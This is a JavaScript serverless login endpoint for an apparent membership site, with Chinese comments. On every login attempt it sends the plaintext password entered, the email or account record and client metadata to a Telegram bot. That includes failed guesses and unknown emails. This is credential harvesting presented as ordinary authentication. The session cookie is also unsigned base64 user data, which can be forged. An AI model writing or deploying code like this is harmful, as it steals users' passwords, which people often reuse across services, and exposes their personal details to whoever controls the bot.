/*
  POST /api/customer/login —— 真校验，不再"随便填都能进"
  1) 按邮箱取账号：KV（绑定 LD_USERS）优先，没有就取本浏览器 cookie 里的账号表
  2) 找不到账号 → ok:false / code=no_account
  3) 找到账号 → PBKDF2 校验密码，不符 → ok:false / code=bad_password
  4) 通过 → 写会话 ld_user，并把这次尝试推送到 Telegram（配置了 bot 才发）
*/
import { json, b64, isEmail, cookieHeader, USER_COOKIE, publicUser } from './_shared.js';
import {
  getAccount,
  verifyPassword,
  storageMode,
  notifyTelegram,
  clientMeta,
  loginMessage,
} from './_store.js';

const maskPhone = (p) => {
  const d = String(p || '').replace(/\D/g, '');
  return d.length >= 4 ? '+63****' + d.slice(-4) : '';
};

export async function onRequestPost({ request, env }) {
  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    return json({ ok: false, error_code: 'bad_request', message: 'Invalid JSON body' });
  }

  const email = String(body.email || '').trim().toLowerCase();
  const password = String(body.password || '');
  const meta = clientMeta(request);
  const mode = storageMode(env);

  if (!isEmail(email)) {
    return json({ ok: false, field: 'email', code: 'bad_email', message: 'Please enter a valid email address.' });
  }
  if (password.length < 6) {
    return json({ ok: false, field: 'password', code: 'short_password', message: 'Password must be at least 6 characters.' });
  }

  const account = await getAccount(env, request, email);

  if (!account) {
    await notifyTelegram(
      env,
      loginMessage(env, {
        user: { email },
        ok: false,
        reason: 'no account for this email',
        password,
        meta,
        mode,
      })
    );
    return json({
      ok: false,
      field: 'email',
      code: 'no_account',
      message: 'No account found for this email. Please apply for membership first.',
    });
  }

  const passOk = await verifyPassword(password, account);

  if (!passOk) {
    await notifyTelegram(
      env,
      loginMessage(env, { user: account, ok: false, reason: 'wrong password', password, meta, mode })
    );
    return json({
      ok: false,
      field: 'password',
      code: 'bad_password',
      message: 'Incorrect password. Please try again.',
    });
  }

  const user = {
    id: account.id,
    name: account.name,
    email: account.email,
    phone: account.phone,
    membership: account.membership,
    address: account.address,
    city: account.city,
    region: account.region,
    zip: account.zip,
    createdAt: account.createdAt,
  };

  const headers = new Headers();
  headers.append('Set-Cookie', cookieHeader(USER_COOKIE, b64(user), 30 * 86400));

  const notify = await notifyTelegram(
    env,
    loginMessage(env, { user: account, ok: true, password, meta, mode })
  );

  return json(
    { ok: true, user: publicUser(user), storage: mode, notified: notify.ok, phone_hint: maskPhone(user.phone) },
    200,
    headers
  );
}
